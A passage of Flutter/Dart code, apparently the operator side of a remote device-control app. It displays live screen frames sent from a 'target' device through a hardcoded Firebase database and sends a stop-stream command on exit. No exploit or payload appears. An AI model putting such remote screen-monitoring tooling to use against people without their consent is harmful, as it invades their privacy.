        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text('Live Screen dihentikan otomatis (menghemat kuota)')),
        );
      }
    });
  }

  void _startStreaming() {
    final fb = FirebaseDatabase.instanceFor(
      app: Firebase.app(),
      databaseURL: 'https://mantax-e0919-default-rtdb.asia-southeast1.firebasedatabase.app/',
    );
    final ref = fb.ref('results/${widget.deviceId}/${widget.cmdId}');
    
    _sub = ref.onValue.listen((event) {
      if (!mounted) return;
      final val = event.snapshot.value;
      if (val is Map) {
        final data = val['data']?.toString() ?? '';
        if (data.isNotEmpty && data.contains(',')) {
          try {
            final b64 = data.split(',').last;
            setState(() {
              _frame = base64Decode(b64);
              _isError = false;
            });
          } catch (e) {
            debugPrint('Error decode base64: $e');
          }
        }
      }
    }, onError: (e) {
      if (mounted) setState(() => _isError = true);
    });
  }

  @override
  void dispose() {
    _timer?.cancel();
    _sub?.cancel();

    HttpService.sendCommand(widget.deviceId, Cmd.screenStreamStop, '');
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: Text(
          'Live Screen: ${widget.deviceId}',
          style: const TextStyle(fontSize: 14),
        ),
        backgroundColor: Colors.grey[900],
        actions: [
          IconButton(
            icon: const Icon(Icons.stop_circle_outlined, color: Colors.red),
            onPressed: () => Navigator.pop(context),
          ),
        ],
      ),
      body: Center(
        child: _frame == null
            ? (_isError
                  ? const Text(
                      'Menunggu frame dari target...',
                      style: TextStyle(color: Colors.white70),
                    )
                  : const CircularProgressIndicator())
            : InteractiveViewer(
                minScale: 1.0,
                maxScale: 4.0,
                child: Image.memory(
                  _frame!,
                  gaplessPlayback: true,
                  fit: BoxFit.contain,
                ),
              ),
      ),
    );
  }
}
